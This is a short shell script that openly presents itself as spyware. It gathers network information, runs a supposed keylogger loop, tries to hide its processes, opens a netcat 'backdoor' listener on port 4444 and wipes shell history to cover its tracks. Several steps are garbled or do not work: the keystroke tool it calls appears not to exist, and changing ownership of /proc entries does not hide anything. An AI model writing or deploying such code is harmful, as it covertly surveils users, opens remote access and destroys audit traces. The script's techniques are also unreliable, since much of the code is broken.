#!/bin/sh

# Collect system information (e.g., IP, location)
ifconfig > /tmp/system_info.txt

# Log keystrokes to keylog.txt
xmodmap -e "keysym KP_1 = 1"
xmodmap -e "keysym KP_2 = 2"

while true; do
    xdotk -geometry 640x480+0+0 &
    sleep 0.5

    # Capture keystrokes
    xdotk -geometry 360x240+960+480 keylog.txt &
    sleep 1

    pkill -f 'xdotk -geometry'
done &

# Hide process from the user and task manager
pgrep -u $UID | while read pid; do
    echo -n "$pid "
done > /tmp/my_pid_list
echo "spyware" >> /tmp/my_pid_list
cat /tmp/my_pid_list | xargs -i sudo chown root. /proc/{}/exe

# Install a backdoor (optional)
nc -lvp 4444 > /dev/null 2>&1 &

# Clean up the script's trace from the shell history
history -c; history -w; history -d $$
